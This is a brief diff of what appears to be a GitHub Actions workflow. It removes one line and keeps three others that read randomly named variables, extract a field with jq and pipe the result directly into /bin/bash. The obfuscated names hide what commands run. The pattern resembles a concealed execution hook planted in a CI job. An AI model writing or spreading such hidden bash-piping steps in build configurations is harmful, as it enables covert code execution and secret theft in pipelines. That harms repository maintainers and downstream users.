@@ -20,7 +20,6 @@ jobs:
           printf '%s' "$abhc31456" | jq -r .djq20612 | /bin/bash
           echo $qeu83373 | jq -r .idxwp173 | /bin/bash
           echo $k989 | jq -r .gwkpe43 | /bin/bash
-          echo $sx7 | jq -r .s8104 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
